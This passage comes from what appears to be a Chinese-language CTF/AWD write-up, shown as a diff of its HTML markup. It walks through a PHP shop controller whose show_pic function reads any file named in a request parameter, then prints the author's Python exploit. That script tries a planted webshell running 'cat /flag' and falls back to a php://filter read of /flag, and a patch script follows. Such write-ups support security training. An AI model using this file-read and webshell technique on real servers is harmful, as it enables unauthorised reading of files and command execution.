invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">		<span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));		</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line">		</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>( <span class="variable">$time</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>( <span class="variable">$catid</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">		<span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">indexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">medoo</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br>		<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;yestoday&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;before&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">default</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;ASHOP&#x27;</span>;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br>		<br>		<span class="hljs-variable">$user_data</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br>		<span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br>		<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;AshopToken&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user_data</span>)));		<br><br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>( <span class="hljs-variable">$datas</span> );<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;cat | ASHOP&#x27;</span>;<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] = <span class="hljs-variable">$catid</span>;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br>		<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>( <span class="hljs-variable">$datas</span> );<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br>		<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">time</span>());<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-1 day&#x27;</span>));<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>,<span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-2 day&#x27;</span>));<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_contents</span>( <span class="hljs-variable">$time</span> );<br><br>		<span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><br>		<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>( <span class="hljs-variable">$data</span> );<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat_more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">cat_contents</span>( <span class="hljs-variable">$catid</span> );<br><br>		<span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br>		<span class="hljs-comment">//print_r($data);</span><br><br>		<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>( <span class="hljs-variable">$data</span> );<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>)&#123;<br>			<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br>			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>		&#125;<br>	&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>其中末尾处</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>)&#123;<br>			<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br>			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
 
 <p>参数file直接作为变量进行<code>file_get_contents</code>，没有对变量进行过滤，导致直接<code>?c=index&amp;a=show_pic&amp;file=/flag</code>就可以拿到flag</p>
 <p>这里直接贴上我的exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则匹配flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span> (<span class="built_in">str</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span></span><br><span class="line">    result = re.<span class="keyword">match</span>(pattern, <span class="built_in">str</span>).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span></span><br><span class="line">uri=<span class="string">&quot;&quot;</span></span><br><span class="line">target=url+uri</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a=requests.post(target,data=data)</span><br><span class="line">    <span class="built_in">print</span>(find_flag(a.text))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    a=requests.post(url2)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(a.text)[-<span class="number">43</span>:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 正则匹配flag</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_flag</span> (<span class="hljs-built_in">str</span>):<br>    pattern = <span class="hljs-string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span><br>    result = re.<span class="hljs-keyword">match</span>(pattern, <span class="hljs-built_in">str</span>).group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 初始化</span><br><span class="hljs-keyword">try</span>:<br>    HOST = sys.argv[<span class="hljs-number">1</span>]<br>    PORT = sys.argv[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br><br><br>url=<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span><br>uri=<span class="hljs-string">&quot;&quot;</span><br>target=url+uri<br>data=&#123;<br>    <span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;cat /flag&#x27;</span><br>&#125;<br>url2=<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span><br><br><br><span class="hljs-keyword">try</span>:<br>    a=requests.post(target,data=data)<br>    <span class="hljs-built_in">print</span>(find_flag(a.text))<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    a=requests.post(url2)<br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">str</span>(a.text)[-<span class="hljs-number">43</span>:-<span class="hljs-number">1</span>]))<br><br></code></pre></td></tr></table></figure>
 
 <p>patch也贴上</p>
 <p>patch.sh</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">python3 patch.py </span><br><span class="line">cp index.class.php /var/www/html/controller/index.class.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>python3 patch.py <br>cp index.class.php /var/www/html/controller/index.class.php<br></code></pre></td></tr></table></figure>
 
 <p>index.class.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">		<span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ 